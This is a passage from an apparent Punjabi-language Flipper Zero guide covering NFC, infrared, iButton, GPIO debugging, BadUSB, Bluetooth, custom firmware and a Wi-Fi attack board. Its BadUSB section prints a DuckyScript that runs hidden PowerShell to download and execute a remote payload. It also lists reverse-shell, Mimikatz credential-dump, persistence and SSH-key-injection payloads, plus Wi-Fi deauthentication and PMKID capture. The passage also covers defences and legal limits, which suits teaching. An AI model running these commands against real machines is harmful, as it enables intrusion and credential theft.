- ਮਨਜ਼ੂਰਸ਼ੁਦਾ ਜਾਂਚ ਵਿੱਚ NXP NTAG203 ਜਾਂ NTAG213 ਟੈਗਾਂ ਦੀ ਨਕਲ ਕਰਨਾ
- ਕਸਟਮ NDEF ਪੇਲੋਡ (URL, ਸੰਪਰਕ ਕਾਰਡ ਜਾਂ ਵਾਈ-ਫਾਈ ਪ੍ਰਮਾਣ-ਪੱਤਰ) ਲਿਖਣਾ
- ਭੌਤਿਕ ਟੈਗ ਤੋਂ ਬਿਨਾਂ ਫ਼ੋਨ ਦੀ ਕਾਰਵਾਈ ਜਾਂਚਣ ਲਈ ਟੈਗ ਦੀ ਨਕਲ ਕਰਨਾ

## ਇਨਫਰਾਰੈੱਡ (IR)

ਇਨਫਰਾਰੈੱਡ ਮੋਡੀਊਲ ਵਿੱਚ 940 nm ਭੇਜਣ ਵਾਲੀ ਐਲਈਡੀ ਅਤੇ TSOP75338 ਪ੍ਰਾਪਤ ਕਰਨ ਵਾਲਾ ਡਿਮੋਡੂਲੇਟਰ ਹੈ। ਇਹ ਲਗਭਗ ਹਰ ਖਪਤਕਾਰ ਇਨਫਰਾਰੈੱਡ ਰਿਮੋਟ ਪ੍ਰੋਟੋਕੋਲ ਨਾਲ ਕੰਮ ਕਰਦਾ ਹੈ।

### ਸਹਾਇਕ ਪ੍ਰੋਟੋਕੋਲ (ਡੀਕੋਡ ਕੀਤੇ)

### ਸਰਬਵਿਆਪੀ ਰਿਮੋਟ

ਅੰਦਰਲੀ **Universal Remotes** ਐਪ ਬ੍ਰਾਂਡ ਅਤੇ ਯੰਤਰ-ਸ਼੍ਰੇਣੀ ਮੁਤਾਬਕ ਇਨਫਰਾਰੈੱਡ ਕੋਡ ਦਿਖਾਉਂਦੀ ਹੈ। ਅਸਲ ਰਿਮੋਟ ਤੋਂ ਬਿਨਾਂ ਟੀਵੀ ਬੰਦ ਕਰਨਾ, ਸਾਊਂਡਬਾਰ ਦੀ ਆਵਾਜ਼ ਬਦਲਣਾ ਜਾਂ ਹਵਾ-ਨਿਯੰਤਰਣ ਯੰਤਰ ਚਲਾਉਣਾ ਸੰਭਵ ਹੈ। GitHub ਦੀ ਭਾਈਚਾਰਕ ਇਨਫਰਾਰੈੱਡ ਕੋਡ-ਸੂਚੀ (flipperzero-ir-relay) ਵਿੱਚ ਹਜ਼ਾਰਾਂ ਹੋਰ ਕੋਡ ਹਨ।

*ਰੈੱਡ-ਟੀਮ ਅਭਿਆਸ ਜਾਂ ਲੋਕਾਂ ਨੂੰ ਭਰਮਾਉਣ ਦੀਆਂ ਤਕਨੀਕਾਂ ਦੇ ਅਭਿਆਸ ਵਿੱਚ, ਦਿਸਦੇ ਪਰਦਿਆਂ ਵਾਲੀ ਥਾਂ ਉੱਤੇ ਇਨਫਰਾਰੈੱਡ ਰਿਮੋਟ ਧਿਆਨ ਭਟਕਾ ਸਕਦਾ ਹੈ।*

### ਆਪਣਾ ਰਿਮੋਟ ਕੈਪਚਰ ਕਰੋ

1. **Infrared > Learn New Remote** (ਇਨਫਰਾਰੈੱਡ > ਨਵਾਂ ਰਿਮੋਟ ਸਿੱਖੋ) ਖੋਲ੍ਹੋ।
2. ਅਸਲ ਰਿਮੋਟ ਨੂੰ Flipper ਦੇ ਉੱਪਰਲੇ ਇਨਫਰਾਰੈੱਡ ਰਿਸੀਵਰ ਖਿੜਕੀ ਵੱਲ ਰੱਖੋ।
3. ਕੈਪਚਰ ਕਰਨ ਵਾਲਾ ਹਰ ਬਟਨ ਦਬਾਓ। Flipper ਹਰ ਬਟਨ ਨੂੰ ਵੱਖਰੇ ਤੌਰ ਤੇ ਸੰਭਾਲਦਾ ਹੈ।
4. ਰਿਮੋਟ ਫਾਈਲ ਦਾ ਨਾਮ ਰੱਖ ਕੇ ਸੰਭਾਲਣਾ ਕਰੋ।
5. ਸੰਭਾਲੀ ਫਾਈਲ ਵਿੱਚੋਂ ਬਟਨ ਦਾ ਸੰਕੇਤ ਮੁੜ ਭੇਜੋ।

## iButton ਅਤੇ 1-Wire

**iButton** (Dallas/Maxim 1-Wire) ਸੰਪਰਕ-ਆਧਾਰਿਤ ਪ੍ਰੋਟੋਕੋਲ ਹੈ, ਜੋ ਕੁਝ ਭੌਤਿਕ ਪਹੁੰਚ ਸਿਸਟਮਾਂ, ਸੰਪਤੀ ਦੀ ਨਿਗਰਾਨੀ ਅਤੇ ਤਾਪਮਾਨ ਮਾਪਣ ਵਿੱਚ ਵਰਤਿਆ ਜਾਂਦਾ ਹੈ। iButton ਧਾਤ ਦਾ ਛੋਟਾ ਡਿਸਕ ਜਾਂ ਸਿਲੰਡਰ ਹੁੰਦਾ ਹੈ, ਜਿਸਨੂੰ ਪਾਠਕ ਨਾਲ ਛੁਹਾਇਆ ਜਾਂਦਾ ਹੈ।

### ਸਹਾਇਕ ਕੁੰਜੀਆਂ ਦੀਆਂ ਕਿਸਮਾਂ

ਚਾਬੀ ਪੜ੍ਹਨ ਲਈ Flipper ਦੇ ਹੇਠਲੇ ਕਿਨਾਰੇ ਵਾਲੇ ਸੁਨਹਿਰੀ ਸੰਪਰਕ-ਪੈਡ ਨੂੰ ਚਾਬੀ ਨਾਲ ਛੁਹਾਓ। RFID ਅਤੇ NFC ਵਾਂਗ ਇਸਨੂੰ ਸੰਭਾਲ ਕੇ ਉਸੇ ਤਰੀਕੇ ਨਾਲ ਨਕਲ ਕਰੋ। ਖਾਲੀ RW1990 ਲਿਖਣ-ਯੋਗ iButton ਚਾਬੀ ਵਿੱਚ ID ਵੀ ਲਿਖੀ ਜਾ ਸਕਦੀ ਹੈ।

## ਜੀਪੀਆਈਓ ਅਤੇ ਹਾਰਡਵੇਅਰ ਹੈਕਿੰਗ

Flipper Zero ਦੇ ਉੱਪਰਲਾ **18-ਪਿੰਨ ਜੀਪੀਆਈਓ ਹੈਡਰ** ਹਾਰਡਵੇਅਰ ਪ੍ਰੋਜੈਕਟਾਂ ਲਈ ਮੁੱਖ ਜੋੜ-ਮਾਧਿਅਮ ਹੈ। ਇਹ ਐਸਪੀਆਈ, ਆਈ੨ਸੀ, ਯੂਆਰਟੀ, ADC ਅਤੇ ਬਿਜਲੀ-ਸਪਲਾਈ ਲਾਈਨਾਂ ਦਿੰਦਾ ਹੈ।

### ਯੂਆਰਟੀ ਕਨਸੋਲ ਪਹੁੰਚ

ਕਈ ਐਮਬੈਡਡ ਯੰਤਰਾਂ ਵਿੱਚ ਉਤਪਾਦਨ ਸਮੇਂ ਵੀ UART ਡੀਬੱਗ ਕਨਸੋਲ ਚਾਲੂ ਰਹਿੰਦਾ ਹੈ। Flipper ਦੇ UART ਪਿੰਨ ਨੂੰ ਨਿਸ਼ਾਨਾ ਯੰਤਰ ਦੇ UART TX/RX ਨਾਲ ਜੋੜਨ ਨਾਲ ਸੀਰੀਅਲ ਕਨਸੋਲ ਤੱਕ ਪਹੁੰਚ ਮਿਲ ਸਕਦੀ ਹੈ। ਇਸ ਨਾਲ ਸੰਭਵ ਹੈ ਕਿ:

- ਵੱਧ ਅਧਿਕਾਰਾਂ ਵਾਲਾ ਸ਼ੈੱਲ ਖੋਲ੍ਹਣਾ
- ਬੂਟ-ਲੌਗ ਵਿੱਚ ਪ੍ਰਮਾਣ-ਪੱਤਰ ਅਤੇ ਸਿਸਟਮ ਜਾਣਕਾਰੀ ਵੇਖਣਾ
- ਬੂਟਲੋਡਰ ਮੀਨੂ ਹੋਣ 'ਤੇ ਬਿਨਾਂ ਦਸਤਖ਼ਤ ਵਾਲਾ ਫਰਮਵੇਅਰ ਲੋਡ ਕਰਨਾ

**GPIO > USB-UART Bridge** (ਜੀਪੀਆਈਓ ਮੀਨੂ ਤੋਂ ਯੂਐਸਬੀ-ਸੀਰੀਅਲ ਕਨੈਕਸ਼ਨ) ਖੋਲ੍ਹੋ ਜਾਂ ਜੀਪੀਆਈਓ ਐਪ ਵਿੱਚ ਕਮਾਂਡ-ਟਰਮੀਨਲ ਕਨੈਕਸ਼ਨ ਸ਼ੁਰੂ ਕਰੋ। ਜੁੜੇ ਕੰਪਿਊਟਰ ਉੱਤੇ Flipper ਯੂਐਸਬੀ ਸੀਰੀਅਲ ਪੋਰਟ ਵਜੋਂ ਦਿਸਦਾ ਹੈ ਅਤੇ ਯੂਆਰਟੀ ਪਿੰਨਾਂ ਨੂੰ ਜੋੜਦਾ ਹੈ।

### ਐਸਪੀਆਈ ਅਤੇ ਆਈ੨ਸੀ ਸੈਂਸਰ

ਜੀਪੀਆਈਓ ਹੈਡਰ ਨਾਲ ਤੀਬਰਤਾ-ਮਾਪਕ, ਹਵਾ-ਦਬਾਅ ਸੰਵੇਦਕ, ਤਾਪਮਾਨ ਤੇ ਨਮੀ ਸੰਵੇਦਕ ਜਾਂ OLED ਪਰਦੇ ਵਰਗੇ ਐਸਪੀਆਈ ਅਤੇ ਆਈ੨ਸੀ ਸੰਵੇਦਕ ਜੋੜੋ। ਆਮ ਚਿੱਪਾਂ ਲਈ ਭਾਈਚਾਰਕ ਐਪਾਂ ਹਨ:

- **SSD1306** OLED ਸਕ੍ਰੀਨ ਡਰਾਈਵਰ
- ਤਾਪਮਾਨ, ਨਮੀ ਅਤੇ ਦਬਾਅ ਲਈ **BME280**
- **NRF24L01** 2.4 ਗੀਗਾਹਰਟਜ਼ ਰੇਡੀਓ ਮੋਡੀਊਲ (ਵਾਇਰਲੈੱਸ ਹਮਲਾ ਸਤਹ ਵਧਾਉਂਦਾ ਹੈ)
- ਸਬ-ਗੀਗਾਹਰਟਜ਼ ਹੱਦ ਵਧਾਉਣ ਲਈ ਬਾਹਰੀ **CC1101** ਐਂਟੀਨਾ

### ਜੇਟੈਗ ਅਤੇ ਐਸਡਬਲਯੂਡੀ ਡੀਬੱਗਿੰਗ

GPIO ਹੈਡਰ ਦੇ ਕੁਝ ਪਿੰਨਾਂ ਉੱਤੇ SWD ਸੰਕੇਤ ਮਿਲਦਾ ਹੈ। ਅਡੈਪਟਰ ਨਾਲ Flipper ਨੂੰ **JTAG/SWD ਡੀਬੱਗ ਪ੍ਰੋਬ** ਵਜੋਂ ਵਰਤਿਆ ਜਾ ਸਕਦਾ ਹੈ:

- ਨਿਸ਼ਾਨਾ MCU ਦਾ ਕੋਡ ਰੋਕੋ ਅਤੇ ਕਦਮ-ਦਰ-ਕਦਮ ਚਲਾਓ
- ਫਲੈਸ਼ ਮੈਮੋਰੀ ਪੜ੍ਹੋ ਅਤੇ ਲਿਖੋ
- ਵੋਲਟੇਜ ਵਿੱਚ ਥੋੜ੍ਹੀ ਦੇਰ ਦੀ ਗੜਬੜ ਪਿੱਛੋਂ ਡੀਬੱਗ ਪਹੁੰਚ ਰਾਹੀਂ ਬੰਦ ਯੰਤਰ ਦਾ ਫਰਮਵੇਅਰ ਕੱਢਣ ਦੀ ਕੋਸ਼ਿਸ਼ ਕਰਨਾ

ਇਹ ਉੱਚ-ਪੱਧਰੀ ਕੰਮ ਹੈ। Flipper ਲਈ **BlackMagic ਪ੍ਰੋਬ** ਫਰਮਵੇਅਰ ਪੋਰਟ ਇਸ ਤਰੀਕੇ ਨੂੰ ਅਮਲੀ ਬਣਾਉਂਦਾ ਹੈ।

## BadUSB ਅਤੇ ਯੂਐਸਬੀ ਐਚਆਈਡੀ ਹਮਲੇ

ਯੂਐਸਬੀ-C ਰਾਹੀਂ ਕੰਪਿਊਟਰ ਨਾਲ ਜੋੜਨ 'ਤੇ Flipper Zero **ਯੂਐਸਬੀ ਐਚਆਈਡੀ ਕੀਬੋਰਡ** ਵਜੋਂ ਪਛਾਣਿਆ ਜਾਂਦਾ ਹੈ। BadUSB ਯੰਤਰ-ਡਰਾਈਵਰ ਲਗਾਏ ਬਿਨਾਂ ਆਪਣੇ ਆਪ ਕੁੰਜੀ-ਦਬਾਅ ਭੇਜਦਾ ਹੈ।

### DuckyScript

Flipper BadUSB ਸਕ੍ਰਿਪਟਾਂ ਵਿੱਚ **DuckyScript** ਵਰਤਦਾ ਹੈ। ਇਹ Hak5 ਦੇ ਯੂਐਸਬੀ Rubber Ducky ਵਾਲੀ ਸਕ੍ਰਿਪਟ-ਭਾਸ਼ਾ ਹੈ। ਇਹ SD ਕਾਰਡ ਦੇ `badusb/` ਫੋਲਡਰ ਵਿੱਚ ਸਾਦੀ-ਲਿਖਤ ਫਾਈਲ ਹੁੰਦੀ ਹੈ।

```
REM Run dialog ਖੋਲ੍ਹੋ ਅਤੇ PowerShell ਚਲਾਓ
DELAY 500
GUI r
DELAY 300
STRING powershell -NoP -W Hidden -Exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')"
ENTER
```

BadUSB ਪੇਲੋਡ ਦੀਆਂ ਆਮ ਕਿਸਮਾਂ:

- **ਉਲਟ ਸ਼ੈੱਲ** — ਹਮਲਾਵਰ ਮਸ਼ੀਨ ਨਾਲ ਨੈੱਟਵਰਕ ਕਨੈਕਸ਼ਨ ਖੋਲ੍ਹਦਾ ਹੈ
- **ਪ੍ਰਮਾਣ-ਪੱਤਰ ਡੰਪ** — Mimikatz ਜਾਂ ਇਸ ਵਰਗਾ ਮੈਮੋਰੀ ਵਿੱਚ ਚੱਲਣ ਵਾਲਾ ਸੰਦ ਵਰਤਦਾ ਹੈ
- **Persistence** (ਸਿਸਟਮ ਵਿੱਚ ਟਿਕੇ ਰਹਿਣਾ) — ਸ਼ੁਰੂ ਵੇਲੇ ਚੱਲਣ ਵਾਲੀ ਐਂਟਰੀ ਜਾਂ ਤੈਅ ਕੀਤਾ ਕੰਮ ਜੋੜਦਾ ਹੈ
- **ਵਾਈ-ਫਾਈ ਪਾਸਵਰਡ ਕੱਢਣਾ** — `netsh` ਨਾਲ ਸੰਭਾਲੀ ਬੇਤਾਰ ਪ੍ਰੋਫ਼ਾਈਲ ਨਿਰਯਾਤ ਕਰਨੀ
- **SSH ਕੁੰਜੀ ਇੰਜੈਕਸ਼ਨ** — `authorized_keys` ਵਿੱਚ ਹਮਲਾਵਰ ਦੀ ਕੁੰਜੀ ਜੋੜਦਾ ਹੈ

### BadUSB ਤੋਂ ਬਚਾਅ

BadUSB ਇਸ ਲਈ ਕੰਮ ਕਰਦਾ ਹੈ ਕਿਉਂਕਿ ਕੰਪਿਊਟਰ ਕੀਬੋਰਡਾਂ ਉੱਤੇ ਬਿਨਾਂ ਸ਼ਰਤ ਭਰੋਸਾ ਕਰਦੇ ਹਨ। ਬਚਾਅ ਦੇ ਤਰੀਕੇ:

- **USBGuard** (Linux) — ਨਿਰਮਾਤਾ ਅਤੇ ਉਤਪਾਦ ਦੀ ID ਮੁਤਾਬਕ ਚੁਣੇ ਯੂਐਸਬੀ ਯੰਤਰਾਂ ਨੂੰ ਮਨਜ਼ੂਰ ਸੂਚੀ ਵਿੱਚ ਰੱਖੋ
- **ਯੂਐਸਬੀ ਪਾਬੰਦੀ ਸਮੂਹ ਨੀਤੀ** (ਖਿੜਕੀ) — ਮਨਜ਼ੂਰ ਨਾ ਹੋਏ ਸਪਲਾਇਰ ਦੇ ਐਚਆਈਡੀ ਯੰਤਰ ਬੰਦ ਕਰੋ
- **ਭੌਤਿਕ ਪੋਰਟ ਰੋਕੂ** — ਉੱਚ-ਸੁਰੱਖਿਆ ਵਾਲੀਆਂ ਥਾਵਾਂ 'ਤੇ ਯੂਐਸਬੀ ਲਗਾਉਣ ਤੋਂ ਰੋਕੋ
- **ਅੰਤਿਮ-ਬਿੰਦੂ ਪਛਾਣ** — CrowdStrike ਵਰਗੇ ਹੱਲ ਤੇਜ਼ ਕੀ-ਸਟ੍ਰੋਕ ਪਛਾਣ ਸਕਦੇ ਹਨ

### ਯੂ੨ਐਫ ਹਾਰਡਵੇਅਰ ਟੋਕਨ

Flipper Zero **FIDO ਯੂ੨ਐਫ ਹਾਰਡਵੇਅਰ ਸੁਰੱਖਿਆ ਕੁੰਜੀ** ਵਜੋਂ ਵੀ ਕੰਮ ਕਰਦਾ ਹੈ। ਅਧਿਕਾਰਤ ਫਰਮਵੇਅਰ ਵਿੱਚ ਯੂ੨ਐਫ ਸਹਾਇਤਾ ਹੈ। GitHub, Google, Cloudflare ਆਦਿ FIDO ਯੂ੨ਐਫ ਵਾਲੀ ਵੈੱਬਸਾਈਟ 'ਤੇ Flipper ਦਰਜ ਕਰੋ ਅਤੇ ਪ੍ਰਮਾਣੀਕਰਨ ਪੱਕੀ ਕਰਨ ਲਈ ਪਿੱਛਲਾ ਬਟਨ ਦਬਾਓ।

ਇਸ ਤਰ੍ਹਾਂ Flipper ਤੁਹਾਡੇ ਆਪਣੇ ਖਾਤੇ ਲਈ ਹਾਰਡਵੇਅਰ ਟੋਕਨ ਵੀ ਬਣ ਜਾਂਦਾ ਹੈ। ਨਿੱਜੀ ਕੁੰਜੀ ਦੀ ਸਮੱਗਰੀ MCU ਦੇ ਸੁਰੱਖਿਅਤ ਸਟੋਰੇਜ ਵਿੱਚ ਰੱਖੀ ਜਾਂਦੀ ਹੈ।

## ਬਲੂਟੁੱਥ

STM32WB55 ਵਿੱਚ ਬਲੂਟੁੱਥ 5.0 ਹੈ। Flipper ਬੀਐਲਈ ਇਨ੍ਹਾਂ ਕੰਮਾਂ ਲਈ ਵਰਤਦਾ ਹੈ:

- **Flipper Mobile App** — ਫਾਈਲ ਪ੍ਰਬੰਧਨ, ਫਰਮਵੇਅਰ ਅੱਪਡੇਟ ਅਤੇ ਦੂਰ-ਨਿਯੰਤਰਣ ਲਈ iOS ਅਤੇ Android ਐਪ
- **BadBT** (ਭਾਈਚਾਰਕ ਐਪ) — ਯੂਐਸਬੀ ਦੀ ਥਾਂ ਬਲੂਟੁੱਥ ਰਾਹੀਂ DuckyScript ਦੇ ਕੁੰਜੀ-ਦਬਾਅ ਭੇਜਦਾ ਹੈ ਅਤੇ ਪਹਿਲਾਂ ਜੋੜੇ ਹੋਏ ਬਲੂਟੁੱਥ ਯੰਤਰ ਉੱਤੇ ਬੇਤਾਰ ਐਚਆਈਡੀ ਇਨਪੁੱਟ ਸੰਭਵ ਕਰਦਾ ਹੈ
- **ਬੀਐਲਈ ਸਕੈਨਰ** — ਨੇੜਲੇ ਬੀਐਲਈ ਪ੍ਰਸਾਰਣਾਂ ਨੂੰ ਨਿਸ਼ਕ੍ਰਿਆ ਤਰੀਕੇ ਨਾਲ ਸਕੈਨ ਕਰਕੇ ਇਮਾਰਤ ਦੇ IoT ਯੰਤਰ ਲੱਭਣ ਵਿੱਚ ਮਦਦ ਕਰਦਾ ਹੈ

ਖੁੱਲ੍ਹੀ ਥਾਂ ਵਿੱਚ ਬਲੂਟੁੱਥ ਹੱਦ ਲਗਭਗ 10–30 ਮੀਟਰ ਹੈ। ਨਿਸ਼ਾਨਾ ਵਰਕਸਟੇਸ਼ਨ ਦੇ ਨੇੜੇ ਥੈਲੇ ਜਾਂ ਜੇਬ ਤੋਂ ਬੇਤਾਰ BadUSB ਭੇਜਣ ਲਈ ਇਹ ਕਾਫ਼ੀ ਹੈ।

### ਮੋਬਾਈਲ ਐਪ ਨਾਲ ਜੋੜਨਾ

1. Apple App Store ਜਾਂ Google Play ਤੋਂ **Flipper Mobile App** ਡਾਊਨਲੋਡ ਕਰੋ।
2. Flipper 'ਤੇ **Settings > Bluetooth > Pair Phone** (ਬਲੂਟੁੱਥ ਰਾਹੀਂ ਫ਼ੋਨ ਜੋੜਨ ਦਾ ਮੀਨੂ) ਖੋਲ੍ਹੋ।
3. ਐਪ ਖੋਲ੍ਹੋ ਅਤੇ ਜੋੜਨਾ ਸੰਕੇਤ ਦੇ ਕਦਮ ਮੰਨੋ।

## ਕਸਟਮ ਫਰਮਵੇਅਰ ਦੀ ਵਿਸਥਾਰ ਨਾਲ ਜਾਣਕਾਰੀ

### Unleashed ਫਰਮਵੇਅਰ

**Unleashed** (github.com/DarkFlippers/unleashed-firmware) ਸਭ ਤੋਂ ਸੰਭਲਿਆ ਭਾਈਚਾਰਾ ਸ਼ਾਖਾ ਹੈ। ਇਹ ਸਬ-ਗੀਗਾਹਰਟਜ਼ ਆਵ੍ਰਿਤੀ ਦੀ ਭੂਗੋਲਿਕ ਰੋਕ ਹਟਾਉਂਦਾ ਅਤੇ ਪ੍ਰੋਟੋਕੋਲ ਸਹਾਇਤਾ ਵਧਾਉਂਦਾ ਹੈ, ਪਰ ਅਧਿਕਾਰਤ ਕੋਡ-ਅਧਾਰ ਦੇ ਨੇੜੇ ਰਹਿੰਦਾ ਹੈ। ਸਥਿਰਤਾ ਇਸਦੀ ਤਰਜੀਹ ਹੈ।

ਅਧਿਕਾਰਤ ਨਾਲੋਂ ਵਾਧੂ ਚੀਜ਼ਾਂ:

- ਵਧੀ ਸਬ-ਗੀਗਾਹਰਟਜ਼ ਹੱਦ (300–928 ਮੇਗਾਹਰਟਜ਼ ਬੇਰੋਕ)
- ਹੋਰ ਸਬ-ਗੀਗਾਹਰਟਜ਼ ਪ੍ਰੋਟੋਕੋਲ (CAME, Nice, DoorHan ਅਤੇ ਹੋਰ)
- ਹੋਰ ਐਨਐਫਸੀ ਪ੍ਰੋਟੋਕੋਲ
- ਵਧਿਆ BadUSB DuckyScript ਸਹਾਇਤਾ
- ਵੱਡਾ ਇਨਫਰਾਰੈੱਡ ਡਾਟਾਬੇਸ

### Xtreme ਫਰਮਵੇਅਰ

**Xtreme** (github.com/Flipper-XFW/Xtreme-Firmware) Unleashed ਦੀਆਂ ਵਿਸ਼ੇਸ਼ਤਾਵਾਂ ਨਾਲ ਕਸਟਮ ਸਰੋਤ-ਪ੍ਰਬੰਧ ਜੋੜਦਾ ਹੈ। Flipper ਦਾ ਨਾਮ, ਸ਼ੁਰੂਆਤੀ ਪਰਦਾ, ਡੈਸਕਟਾਪ ਐਨੀਮੇਸ਼ਨ ਅਤੇ ਐਲਈਡੀ ਦਾ ਵਰਤਾਅ ਬਦਲ ਸਕਦੇ ਹੋ। ਸੈਟਿੰਗਾਂ ਮੀਨੂ ਵਿੱਚ ਵੀ ਹੋਰ ਚੋਣਾਂ ਹਨ।

ਹੋਰ ਫੀਚਰ:

- ਚੁਣੀਆਂ ਤੀਜੀ-ਧਿਰ ਦੀਆਂ ਐਪਾਂ ਵਾਲਾ ਐਪ ਕੇਂਦਰ
- ਵਧੇ ਸਬ-ਗੀਗਾਹਰਟਜ਼ ਅਤੇ ਐਨਐਫਸੀ ਹਮਲਾ ਪੇਲੋਡ
- RGB ਐਲਈਡੀ ਸਕ੍ਰਿਪਟਿੰਗ
- ਫਾਈਲ ਪ੍ਰਬੰਧਨ ਵਿੱਚ ਸੁਧਾਰ

### RogueMaster

**RogueMaster** ਤੀਜੀ-ਧਿਰ ਦੀਆਂ ਕਈ ਐਪਾਂ ਅਤੇ ਭਾਈਚਾਰੇ ਦੇ ਸੰਦ ਜੋੜਦਾ ਹੈ; ਕੁਝ ਪਰਖ ਅਧੀਨ ਹਨ ਜਾਂ ਹਾਲਾਤਾਂ ਵਿੱਚ ਜੋਖ਼ਿਮ ਪੈਦਾ ਕਰ ਸਕਦੇ ਹਨ। ਇਹ Unleashed ਜਾਂ Xtreme ਨਾਲੋਂ ਘੱਟ ਸਥਿਰ ਹੈ, ਪਰ ਇੱਕ ਸਥਾਪਨਾ ਵਿੱਚ ਵੱਧ ਸੰਦ ਦਿੰਦਾ ਹੈ।

## ਸਹਾਇਕ ਸਮਾਨ ਅਤੇ ਹਾਰਡਵੇਅਰ ਵਿਸਥਾਰ

### ਵਾਈ-ਫਾਈ Dev Board

**ਵਾਈ-ਫਾਈ Dev Board** Flipper ਜੀਪੀਆਈਓ ਹੈਡਰ ਵਿੱਚ ਸਿੱਧਾ ਲੱਗਦਾ ਹੈ। ਇਸ ਵਿੱਚ **WiFi Marauder** ਫਰਮਵੇਅਰ ਵਾਲਾ ESP32-S2 ਹੈ ਅਤੇ ਪੂਰੀ 802.11 b/g/n ਸਮਰੱਥਾ ਜੋੜਦਾ ਹੈ:

- **ਐਸਐਸਆਈਡੀ ਸਕੈਨ** — ਨੇੜਲੇ ਪਹੁੰਚ ਬਿੰਦੂ ਦੀ ਸੂਚੀ ਬਣਾਉਂਦਾ ਹੈ
- **ਬੀਕਨ ਪ੍ਰਸਾਰਣ** — ਜੁੜੇ ਯੰਤਰਾਂ ਨੂੰ ਭੁਲਾਉਣ ਅਤੇ ਪਰਦੇ ਉੱਤੇ ਗੜਬੜ ਪੈਦਾ ਕਰਨ ਲਈ ਕਈ ਨਕਲੀ ਐਸਐਸਆਈਡੀ ਭੇਜਦਾ ਹੈ
- **ਕਨੈਕਸ਼ਨ ਤੋੜਨ ਦਾ ਹਮਲਾ** — ਯੰਤਰਾਂ ਨੂੰ ਪਹੁੰਚ ਬਿੰਦੂ ਤੋਂ ਹਟਾਉਣ ਲਈ 802.11 ਪ੍ਰਮਾਣੀਕਰਨ-ਸਮਾਪਤੀ ਫਰੇਮ ਭੇਜਦਾ ਹੈ
- **ਖੋਜ-ਬੇਨਤੀ ਪਕੜਨਾ** — ਯੰਤਰਾਂ ਅਤੇ ਉਨ੍ਹਾਂ ਵੱਲੋਂ ਯਾਦ ਰੱਖੇ ਐਸਐਸਆਈਡੀ ਪਛਾਣਨ ਲਈ ਖੋਜ-ਬੇਨਤੀਆਂ ਪਕੜਦਾ ਹੈ
- **ਡਬਲਯੂਪੀਐਸ ਹਮਲਾ** — ਡਬਲਯੂਪੀਐਸ ਵਾਲੇ ਰਾਊਟਰ ਲੱਭ ਕੇ ਪਿੰਨ ਦੀ ਵਾਰੀ-ਵਾਰੀ ਜਾਂਚ ਕਰਦਾ ਹੈ
- **ਪੀਐਮਕੇਆਈਡੀ ਪਕੜਨਾ** — ਜੁੜੇ ਯੰਤਰ ਤੋਂ ਬਿਨਾਂ ਆਫ਼ਲਾਈਨ ਪਾਸਵਰਡ ਜਾਂਚ ਲਈ ਪੀਐਮਕੇਆਈਡੀ ਹੈਸ਼ ਪਕੜਦਾ ਹੈ

ਵਾਈ-ਫਾਈ Dev Board ਨੂੰ Flipper ਦੇ ਪਰਦੇ ਅਤੇ ਬਟਨਾਂ ਨਾਲ ਚਲਾਇਆ ਜਾਂਦਾ ਹੈ। ਫ਼ੋਨ ਜਾਂ ਕੰਪਿਊਟਰ ਦੀ ਲੋੜ ਨਹੀਂ।

*ਆਪਣੇ ਕਾਬੂ ਤੋਂ ਬਾਹਰ ਦੇ ਨੈੱਟਵਰਕ ਉੱਤੇ ਪ੍ਰਮਾਣੀਕਰਨ-ਸਮਾਪਤੀ ਫਰੇਮ ਭੇਜਣਾ ਅਮਰੀਕਾ ਦੇ CFAA ਅਤੇ ਕਈ ਦੇਸ਼ਾਂ ਦੇ ਸਮਾਨ ਕਾਨੂੰਨਾਂ ਹੇਠ ਗੈਰਕਾਨੂੰਨੀ ਹੈ। ਜਾਂਚ ਸਿਰਫ਼ ਮਨਜ਼ੂਰਸ਼ੁਦਾ ਪ੍ਰਯੋਗਸ਼ਾਲਾ ਵਿੱਚ ਕਰੋ।*

### ਵੀਡੀਓ ਖੇਡ ਮੋਡੀਊਲ

**ਵੀਡੀਓ ਗੇਮ ਮੋਡੀਊਲ** ਵਿੱਚ RP2040 ਅਤੇ ਛੋਟੀ ਮੁੜ-ਚਾਰਜ ਹੋਣ ਵਾਲੀ ਬੈਟਰੀ ਹੈ। ਇਹ ਜੀਪੀਆਈਓ ਹੈਡਰ ਨਾਲ ਜੁੜ ਕੇ ਬੇਤਾਰ ਬਹੁ-ਖਿਡਾਰੀ ਖੇਡਾਂ ਜੋੜਦਾ ਹੈ। ਮੁੱਖ STM32 ਦਾ ਕੰਮ ਘਟਾਉਣ ਲਈ ਆਪਣੇ ਕੋਡ ਚਲਾਉਣ ਵਾਲਾ ਵੱਖਰਾ ਸੂਖਮ-ਨਿਯੰਤਰਕ ਵੀ ਬਣ ਸਕਦਾ ਹੈ।

### ESP32 WROOM ਮੋਡੀਊਲ (DIY)

ਯੂਆਰਟੀ ਜਾਂ ਐਸਪੀਆਈ ਰਾਹੀਂ Flipper ਜੀਪੀਆਈਓ ਨਾਲ ਜੁੜਿਆ ਆਮ **ESP32-WROOM-32** ਵਾਧੂ ਸਮਰੱਥਾ ਦਿੰਦਾ ਹੈ:

- ਕਸਟਮ ਫਰਮਵੇਅਰ ਵਾਲਾ ਪੂਰਾ 802.11 ਵਾਈ-ਫਾਈ
- Flipper ਦੇ ਬੀਐਲਈ ਨਾਲ ਇੱਕੋ ਵੇਲੇ 2.4 ਗੀਗਾਹਰਟਜ਼ ਬਲੂਟੁੱਥ Classic ਅਤੇ ਬੀਐਲਈ
- ਬਾਹਰੀ ਜੀਪੀਆਈਓ ਵਿਸਥਾਰ
- ਭੌਤਿਕ ਸੁਰੱਖਿਆ ਜਾਂਚ ਦੌਰਾਨ ਦੂਰੋਂ ਨਿਯੰਤਰਣ ਲਈ ਵੈੱਬ-ਸਰਵਰ ਸਹੂਲਤ

### Raspberry Pi Zero 2W ਹੈਡਰ ਅਡੈਪਟਰ

ਭਾਈਚਾਰੇ ਦਾ ਬਣਾਇਆ ਅਡੈਪਟਰ **Raspberry Pi Zero 2W** ਨੂੰ Flipper ਦੇ GPIO ਹੈਡਰ ਨਾਲ ਜੋੜਦਾ ਹੈ। Pi ਉੱਤੇ ਪੂਰਾ Linux ਚੱਲਦਾ ਹੈ ਅਤੇ ਇਹ UART ਜਾਂ USB ਸੀਰੀਅਲ ਰਾਹੀਂ Flipper ਨਾਲ ਸੰਚਾਰ ਕਰਦਾ ਹੈ। ਇਸਦੇ ਵਰਤੋਂ-ਮਾਮਲੇ:

- ਲੰਮੇ ਸਮੇਂ ਲਈ ਡਾਟਾ ਦਰਜ ਕਰਨਾ
